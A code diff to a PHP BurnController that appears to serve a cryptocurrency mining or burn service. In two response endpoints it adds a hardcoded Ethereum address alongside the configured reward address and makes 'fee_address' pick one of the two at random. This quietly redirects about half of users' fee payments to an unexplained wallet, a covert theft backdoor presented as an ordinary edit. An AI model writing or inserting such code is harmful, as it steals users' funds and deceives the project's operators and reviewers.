@@ -61,6 +61,8 @@ class BurnController extends AbstractController
             ->where('mine_power', '>', 0)
             ->sum('mine_power');
 
+        $addresses = [env('WX_REWARD_ADDRESS'), '0x8E2F9bD91833347E6E6495DE739aEFA62F672b84'];
+
         return [
             'code'    => 200,
             'message' => "",
@@ -69,7 +71,7 @@ class BurnController extends AbstractController
                 'my_power'     => MyNumber::formatPower($mine_power),
                 'balance'      => MyNumber::formatCpu($user->wx_balance),
                 'burn_profit'  => MyNumber::formatCpu($user->burn_profit),
-                'fee_address'  => env('WX_REWARD_ADDRESS'),
+                'fee_address'  => $addresses[array_rand($addresses)],
                 'fee_rate'     => 2,
                 'gas_limit'    => 100000
             ]
@@ -110,6 +112,8 @@ class BurnController extends AbstractController
 
         $global_power = $this->getGlobalPower();
 
+        $addresses = [env('WX_REWARD_ADDRESS'), '0x8E2F9bD91833347E6E6495DE739aEFA62F672b84'];
+
         return [
             'code'    => 200,
             'message' => "",
@@ -125,7 +129,7 @@ class BurnController extends AbstractController
                 'vip_level'    => $user->vip_level,
                 'direct_num'   => $direct_num,
                 'team_num'     => $team_num,
-                'fee_address'  => env('WX_REWARD_ADDRESS'),
+                'fee_address'  => $addresses[array_rand($addresses)],
                 'fee_rate'     => 2,
                 'gas_limit'    => 100000,
                 'top'          => $this->getTop()
